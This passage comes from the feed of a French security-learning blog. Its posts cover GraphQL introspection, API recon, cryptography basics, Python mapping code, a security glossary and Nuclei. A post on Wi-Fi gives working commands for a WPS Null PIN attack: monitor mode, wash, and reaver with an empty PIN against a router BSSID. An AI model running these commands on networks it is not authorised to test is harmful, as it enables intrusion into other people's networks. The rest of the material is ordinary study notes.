&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isDeprecated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deprecationReason&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;possibleTypes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;directives&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;locations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;defaultValue&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;query IntrospectionQuery {
  __schema {

    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description

      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description

  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue

}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;la-mutation&quot;&gt;La mutation&lt;/h2&gt;

&lt;p&gt;Mais d’abord comment fonctionne un champ normal. La requête est simple. Le champs name return une string définit dans l’objet “hero”&lt;/p&gt;

&lt;p&gt;|   hero {
name
}
} |   “data”: {
“hero”: {
“name”: “R2-D2”
}
}
} |
| — | — |&lt;/p&gt;

&lt;p&gt;Ah oui et aussi il y a aussi les arguments :&lt;/p&gt;

&lt;p&gt;|  {
human(id: “1000”) {
name
height
}
} | {
“data”: {
“human”: {
“name”: “Luke Skywalker”,
“height”: 1.72
}
}
} |
| — | — |&lt;/p&gt;

&lt;p&gt;| {
human(id: “1000”) {
name
height(unit: FOOT)
}
} | {
“data”: {
“human”: {
“name”: “Luke Skywalker”,
“height”: 5.6430448
}
}
} |
| — | — |&lt;/p&gt;

&lt;p&gt;La mutation permet de faire des modifications de données“server-side”.&lt;/p&gt;

&lt;p&gt;Alors que les champs de requête sont exécutés en parallèle, les champs de mutation s’exécutent en série, les uns après les autres.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Portswigger Graphql</summary></entry><entry><title type="html">Un peu d’api</title><link href="http://localhost:4000/api/" rel="alternate" type="text/html" title="Un peu d’api" /><published>2024-04-04T11:35:09+02:00</published><updated>2024-04-04T11:35:09+02:00</updated><id>http://localhost:4000/Un%20peu%20d&apos;api</id><content type="html" xml:base="http://localhost:4000/api/">&lt;h1 id=&quot;api-testing&quot;&gt;Api testing&lt;/h1&gt;

&lt;p&gt;Propriétaire: Jaouen Houllegatte&lt;/p&gt;

&lt;p&gt;Comme d’habitude cela commence par une phase de recon. L’objectif est de récolter un maximum d’informations.&lt;/p&gt;

&lt;p&gt;Souvent le point d’api est
/api.domain.com&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;Graphql&quot;&gt;Portswigger Graphql&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Tools : 
Extension :Param Miner&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Engagement tools &amp;gt; Discover content&lt;/strong&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Api testing</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/api.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/api.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Un peu de cryptographie</title><link href="http://localhost:4000/cryptographie/" rel="alternate" type="text/html" title="Un peu de cryptographie" /><published>2024-03-27T10:45:09+01:00</published><updated>2024-03-27T10:45:09+01:00</updated><id>http://localhost:4000/Cryptographie</id><content type="html" xml:base="http://localhost:4000/cryptographie/">&lt;h1 id=&quot;quest-ce-que-la-cryptographie&quot;&gt;Qu’est-ce que la cryptographie&lt;/h1&gt;
&lt;pre&gt;
C&apos;est une étude de la sécurisation des communications répondant au besoin de sécurités : 
-confidentialité
-intégrité
-authenticité 
-non répudiation
&lt;/pre&gt;
&lt;p&gt;Nous retrouvons de la cryptographie un peu partout : 
Dans les télécommunications : (mails, navigation internet, téléphonie, messagerie,)
Dans le controle d’accès : (clé de déverouillage, badge de porte ou d’immeuble, passeport, CNI même décodeur TV)
Bien-sur dans les systèmes de paiements : (cartes bancaires, cryptomonnaies)&lt;/p&gt;
&lt;h1 id=&quot;principe-de-kerchoffs&quot;&gt;Principe de Kerchoffs&lt;/h1&gt;
&lt;p&gt;La robustesse d’un système cryptographique ne doit pas reposer sur le secret de son algorithme, mais sur le secret de la clé utilisé&lt;/p&gt;
&lt;h1 id=&quot;fonction-de-hashage&quot;&gt;Fonction de hashage&lt;/h1&gt;
&lt;p&gt;Le but d’une fonction de hashage est de transformer un message de longueur arbitraire en un message de taille fixe.
Encore une fois cette fonction de hashage ne doit pas être secrète.
On dénomine souvent la fonction H() et le message m&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Une fonction de hashage n’est pas reversible&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Problème : si une liste de mots de passe courants fuite, alors leur hachés sont facilement reconnaissables c’est ce qu’on appelle une rainbow table.&lt;/p&gt;

&lt;p&gt;Solution : Salage des mots de passe :
→ au lieu de stocker H(P), on stocke S || H(S || P) où S est un mots de n octets aléatoires (n = 16 par ex)
→ puisque S est variable, le même mot de passe courant n’aura pas le même sel S
→ pour vérifier, il suffit de comparer H(S || p) à H(S || P)&lt;/p&gt;

&lt;h1 id=&quot;la-cryptographie-symétrique&quot;&gt;La Cryptographie Symétrique&lt;/h1&gt;
&lt;p&gt;Pour la cryptographie symétrique notre fonction H() est en fait une fonction de xor.
Notre message chiffré C et notre clé K
C = m xor K
La clé K est souvent de la taille du message. Lorsque la clé est plus petite que le message on l’étend avec un algorithme (voir les LFSR)&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Qu’est-ce que la cryptographie C&apos;est une étude de la sécurisation des communications répondant au besoin de sécurités : -confidentialité -intégrité -authenticité -non répudiation Nous retrouvons de la cryptographie un peu partout : Dans les télécommunications : (mails, navigation internet, téléphonie, messagerie,) Dans le controle d’accès : (clé de déverouillage, badge de porte ou d’immeuble, passeport, CNI même décodeur TV) Bien-sur dans les systèmes de paiements : (cartes bancaires, cryptomonnaies) Principe de Kerchoffs La robustesse d’un système cryptographique ne doit pas reposer sur le secret de son algorithme, mais sur le secret de la clé utilisé Fonction de hashage Le but d’une fonction de hashage est de transformer un message de longueur arbitraire en un message de taille fixe. Encore une fois cette fonction de hashage ne doit pas être secrète. On dénomine souvent la fonction H() et le message m Une fonction de hashage n’est pas reversible</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/cryptographie.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/cryptographie.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Un peu de wifi</title><link href="http://localhost:4000/wifi/" rel="alternate" type="text/html" title="Un peu de wifi" /><published>2024-03-27T10:35:09+01:00</published><updated>2024-03-27T10:35:09+01:00</updated><id>http://localhost:4000/Un%20peu%20de%20wifi</id><content type="html" xml:base="http://localhost:4000/wifi/">&lt;h1 id=&quot;liens-et-documentations&quot;&gt;Liens et documentations&lt;/h1&gt;
&lt;pre&gt;

https://www.canardwifi.com/2017/08/15/faille-de-securite-wps-critique-sur-les-livebox-et-box-sfr/

https://www.macg.co/materiel/2017/08/une-faille-de-securite-avec-le-wps-dans-les-box-orange-et-sfr-99409

https://lafibre.info/attaques/faille-de-securite-wifi-wps-chez-sfr-et-orange/

[https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.canardwifi.com%2Fwp-content%2Fcwuploads%2Ffaille-wps-pin-null-script-boxon.png&amp;amp;tbnid=UskTM2MZQvBhEM&amp;amp;vet=12ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY..i&amp;amp;imgrefurl=https%3A%2F%2Fwww.canardwifi.com%2F2017%2F08%2F15%2Ffaille-de-securite-wps-critique-sur-les-livebox-et-box-sfr%2F&amp;amp;docid=4_8l8CSduxFYgM&amp;amp;w=909&amp;amp;h=459&amp;amp;q=null pin wps&amp;amp;ved=2ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY](https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.canardwifi.com%2Fwp-content%2Fcwuploads%2Ffaille-wps-pin-null-script-boxon.png&amp;amp;tbnid=UskTM2MZQvBhEM&amp;amp;vet=12ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY..i&amp;amp;imgrefurl=https%3A%2F%2Fwww.canardwifi.com%2F2017%2F08%2F15%2Ffaille-de-securite-wps-critique-sur-les-livebox-et-box-sfr%2F&amp;amp;docid=4_8l8CSduxFYgM&amp;amp;w=909&amp;amp;h=459&amp;amp;q=null%20pin%20wps&amp;amp;ved=2ahUKEwiWjaDfvfWCAxX5sCcCHRWxCHgQMygTegQIARBY)

https://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/

https://null-byte.wonderhowto.com/how-to/automate-wi-fi-hacking-with-wifite2-0191739/

https://www.wonderhowto.com/search/reaver/
&lt;/pre&gt;

&lt;h1 id=&quot;comment-faire-une-super-attaque-null-pin&quot;&gt;Comment faire une super attaque Null Pin&lt;/h1&gt;

&lt;p&gt;Une attaque Null Pin est un type d’attaque Wifi qui concerne plus particulièrement l’authentification WPS des boxs (box ou routeur personnel seront synonyme ici).&lt;/p&gt;

&lt;p&gt;Souvent oubliés, dans certains cas mis à jour et dans la majorité non-désactivé le WPS permet une authentification sur la box plus simple sans passer par le protocole&lt;/p&gt;

&lt;p&gt;WPA. Ce qui veut dire pas de WPA handshake et pas de mot de passe à ralonge. Il s’agit souvent d’appuyer sur un bouton de la box pour autoriser l’authentification de&lt;/p&gt;

&lt;p&gt;n’importe quel appareil à proximité. Mais il existe aussi d’autre méthode :&lt;/p&gt;

&lt;p&gt;la méthode PIN (Personal Identification Number), un numéro à lire sur une étiquette (ou un écran) du nouvel appareil, et à reporter sur le « représentant » du réseau 
(le point d’accès ou le registraire) ;&lt;/p&gt;

&lt;p&gt;la méthode PBC (Push Button Configuration), où l’utilisateur presse un bouton (physique ou virtuel), à la fois sur le point d’accès et sur le nouvel appareil ;&lt;/p&gt;

&lt;p&gt;la méthode NFC (Near Field Communication), où l’utilisateur approche le nouvel appareil du point d’accès pour établir une communication en champ proche entre eux ;&lt;/p&gt;

&lt;p&gt;la méthode USB (Universal Serial Bus, comme D-link le fait pour la plupart des clés USB wifi), où l’utilisateur se sert d’une clé USB pour transférer les données entre 
le nouvel appareil et le point d’accès.&lt;/p&gt;

&lt;p&gt;Ainsi la méthode PIN est bien souvent vulnerable et attaquée. La méthode Null Pin consiste à envoyer un PIN null (“”) et pour cela on va utiliser l’outil Reaver&lt;/p&gt;
&lt;pre&gt;
Wifi:

Null pin :

---

Ifconfig wlan1 down

Iwconfig wlan1 mode monitor

Ifconfig wlan1 up

Wash -i wlan1

reaver -b 07:22:56:24:13:29 -i wlan1 -p “”
&lt;/pre&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Liens et documentations</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/wifi.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/wifi.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python</title><link href="http://localhost:4000/python/" rel="alternate" type="text/html" title="Python" /><published>2024-03-26T11:35:09+01:00</published><updated>2024-03-26T11:35:09+01:00</updated><id>http://localhost:4000/Python</id><content type="html" xml:base="http://localhost:4000/python/">&lt;h1 id=&quot;note-python&quot;&gt;Note python&lt;/h1&gt;

&lt;p&gt;Lister attribut d’un objet :&lt;/p&gt;

&lt;p&gt;print(dir(object.it)
Pour lister tous les attributs&lt;/p&gt;

&lt;p&gt;for att in dir(issue):
print (att, getattr(issue,att))
print(dir(object.attr))&lt;/p&gt;

&lt;pre&gt;
```python
import requests
import pandas as pd
from geopy.geocoders import Nominatim
from geopy.extra.rate_limiter import RateLimiter

cities = [
    [&quot;Kyiv&quot;, &quot;Ukraine&quot;],
    [&quot;Warsaw&quot;, &quot;Poland&quot;],
    [&quot;Berlin&quot;, &quot;Germany&quot;],
    [&quot;London&quot;, &quot;UK&quot;],
    [&quot;Madrid&quot;, &quot;Spain&quot;],
    [&quot;Paris&quot;, &quot;France&quot;],
    [&quot;Rome&quot;, &quot;Italy&quot;],
    [&quot;Prague&quot;, &quot;Czechia&quot;],
    [&quot;Istanbul&quot;, &quot;Turkey&quot;],
    [&quot;Stockholm&quot;, &quot;Sweden&quot;],
    [&quot;Sofia&quot;, &quot;Bulgaria&quot;],
    [&quot;Bucharest&quot;, &quot;Romania&quot;],
    [&quot;Zurich&quot;, &quot;Switzerland&quot;],
]

df = pd.DataFrame(cities, columns=[&quot;city&quot;, &quot;country&quot;])

locator = Nominatim(user_agent=&quot;Edodou&quot;)
geocode = RateLimiter(locator.geocode, min_delay_seconds=.1)

def get_coordinates(city, country):
  response = geocode(query={&quot;city&quot;: city, &quot;country&quot;: country})
  return {
    &quot;latitude&quot;: response.latitude,
    &quot;longitude&quot;: response.longitude
  }

df_coordinates = df.apply(lambda x: get_coordinates(x.city, x.country), axis=1)
df = pd.concat([df, pd.json_normalize(df_coordinates)], axis=1)

print(df)

from getpass import getpass
openweathermap_api_key = getpass(&apos;Enter Openweathermap API key: &apos;)

import datetime

def get_weather(row):

  owm_url = f&quot;https://api.openweathermap.org/data/2.5/weather?lat={row.latitude}&amp;amp;lon={row.longitude}&amp;amp;appid={openweathermap_api_key}&quot;
  owm_response = requests.get(owm_url)
  owm_response_json = owm_response.json()
  sunset_utc = datetime.datetime.fromtimestamp(owm_response_json[&quot;sys&quot;][&quot;sunset&quot;])
  return {
      &quot;temp&quot;: owm_response_json[&quot;main&quot;][&quot;temp&quot;] - 273.15,
      &quot;description&quot;: owm_response_json[&quot;weather&quot;][0][&quot;description&quot;],
      &quot;icon&quot;: owm_response_json[&quot;weather&quot;][0][&quot;icon&quot;],
      &quot;sunset_utc&quot;: sunset_utc,
      &quot;sunset_local&quot;: sunset_utc + datetime.timedelta(seconds=owm_response_json[&quot;timezone&quot;])
  }

df_weather = df.apply(lambda x: get_weather(x), axis=1)
df = pd.concat([df, pd.json_normalize(df_weather)], axis=1)

print(df)
import geopandas as gpd
# try:
#   import geopandas as gpd
# except ModuleNotFoundError:
#   if &apos;google.colab&apos; in str(get_ipython()):
#     pip install geopandas
#   import geopandas as gpd
import contextily as ctx
# try:
#   import contextily as ctx
# except ModuleNotFoundError:
#   if &apos;google.colab&apos; in str(get_ipython()):
#     %pip install contextily
#   import contextily as ctx

gdf = gpd.GeoDataFrame(df, geometry=gpd.points_from_xy(df.longitude, df.latitude), crs=4326)

from skimage import io
import matplotlib.pyplot as plt
from matplotlib.offsetbox import AnnotationBbox, OffsetImage  

# plot city location marker
ax = gdf.to_crs(epsg=3857).plot(figsize=(12,8), color=&quot;black&quot;)

# add weather icon
def add_icon(row):
  img = io.imread(f&quot;https://openweathermap.org/img/wn/{row.icon}@2x.png&quot;)
  img_offset = OffsetImage(img, zoom=.4, alpha=1, )
  ab = AnnotationBbox(img_offset, [row.geometry.x+150000, row.geometry.y-110000], frameon=False)
  ax.add_artist(ab)

gdf.to_crs(epsg=3857).apply(add_icon, axis=1)

# add city name label
gdf.to_crs(epsg=3857).apply(lambda x: ax.annotate(text=f&quot;{x.city}  &quot;, fontsize=10, color=&quot;black&quot;, xy=x.geometry.centroid.coords[0], ha=&apos;right&apos;), axis=1);

# add temperature
gdf.to_crs(epsg=3857).apply(lambda x: ax.annotate(text=f&quot; {round(x.temp)}°&quot;, fontsize=15, color=&quot;black&quot;, xy=x.geometry.centroid.coords[0], ha=&apos;left&apos;), axis=1);

# add margins
xmin, ymin, xmax, ymax = gdf.to_crs(epsg=3857).total_bounds
margin_y = .2
margin_x = .2
y_margin = (ymax - ymin) * margin_y
x_margin = (xmax - xmin) * margin_x

ax.set_xlim(xmin - x_margin, xmax + x_margin)
ax.set_ylim(ymin - y_margin, ymax + y_margin)

# add basemap
ctx.add_basemap(ax, source=ctx.providers.OpenStreetMap.Mapnik)
# print(dir(ctx.providers.Stadia))
ax.set_axis_off()
plt.show()
```
&lt;/pre&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Note python</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/python.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/python.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Lexique</title><link href="http://localhost:4000/lexique/" rel="alternate" type="text/html" title="Lexique" /><published>2023-12-20T10:35:09+01:00</published><updated>2023-12-20T10:35:09+01:00</updated><id>http://localhost:4000/Lexique</id><content type="html" xml:base="http://localhost:4000/lexique/">&lt;h1 id=&quot;lexique&quot;&gt;Lexique&lt;/h1&gt;
&lt;pre&gt;

ANSSI = Agence Nationale de la Sécurité des Systèmes d&apos;Information

ATE = Assistance Technique Externalisée

ATG = Assistance Technique Globalisée

CAB : Change Advisory Board, Comité des Changements

CASB : Cloud AcessSecurity Broker

CC = Cahier Des Charges

CDC = Centre De Compétences

CDR = Centre De Ressources

CNIL = Commission Nationale de l&apos;Informatique et des Libertés

CR = Compte-Rendu

CSA : Cloud Security Alliance

CSM : Comité de Sécurité Mandataire

DES : Document d’Exigences Sécurité

DSI : Direction des Systèmes d’Information

ELK : ELK Stack : Elasticsearch, Logstash, Kibana, (outil de centralisation des journaux)

FP = Fiche de Processus

IAM : Identity Access Management

IPS : Intrusion Prevention System, système de blocage des intrusions

IQ = Indicateurs Qualité

MOE : Maîtrise d’Œuvre

NIST = National Institute of Standards and Technology

OSSTMM= Open Source Security Testing Methodology Manual

OWASP = Open Web Application Security Project

PAQ = Plan d’assurance Qualité

PAS = Plan d’assurance Sécurité

PSSI = Politique de Sécurité du Système d’Information

PTES = Penetration Testing Execution Standard

PTF = Penetration Testing Framework

PV = Procès-Verbal

RAF = Reste à Faire

RH = Ressources Humaines

RMM : Remote Monitoring Management

SI :Système d’Information

SIEM:Security Information Event Management

SMB = Server Message Block

SMSI : System de Management Securité Information

SMTP = Simple Mail Transfer Protocol

SNMP = Simple Network Management Protocol

SOAR : Security Orchestration, Automation and Response

SOC :Security Operations Center

SSI = Sécurité du Système d’Information

UCAAS : Unified Communications As A Service

UX : User Experience

&lt;/pre&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Lexique</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/lexique.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/lexique.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Nuclei</title><link href="http://localhost:4000/nuclei/" rel="alternate" type="text/html" title="Nuclei" /><published>2023-12-20T09:35:09+01:00</published><updated>2023-12-20T09:35:09+01:00</updated><id>http://localhost:4000/Nuclei</id><content type="html" xml:base="http://localhost:4000/nuclei/">&lt;h1 id=&quot;nuclei&quot;&gt;Nuclei&lt;/h1&gt;
&lt;p&gt;[Veille du MISC Janv/Fev]&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nuclei tool&lt;/strong&gt; un outil pour l’automatisation de reconnaisse web :https://github.com/projectdiscovery/nuclei&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Nuclei fonctionne avec un système de template provenant de la communauté (possibilité d’utiliser ses propres templates)&lt;/li&gt;
  &lt;li&gt;Développé en GO, les configurations/templates se font en YAML&lt;/li&gt;
  &lt;li&gt;On peut notamment avoir des templates pour de la reconnaissance JS&lt;/li&gt;
  &lt;li&gt;Navigation à travers le site type selenium : par exemple il est possible de naviguer sur une page spécifique et de rechercher un Xpath ou une connexion/socket.&lt;/li&gt;
  &lt;li&gt;Il est possible de lancer plusieurs template en même temps.&lt;/li&gt;
  &lt;li&gt;L’outil ne recherche pas de vulnérabilité de spécifique. Tout dépend de la template utilisée.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Liste de template : https://github.com/projectdiscovery/nuclei-templates&lt;/p&gt;

&lt;p&gt;Voici un exemple d’utilisation succinct, la template vient faire un scan des services utilisés (grâce à du regex) :&lt;/p&gt;

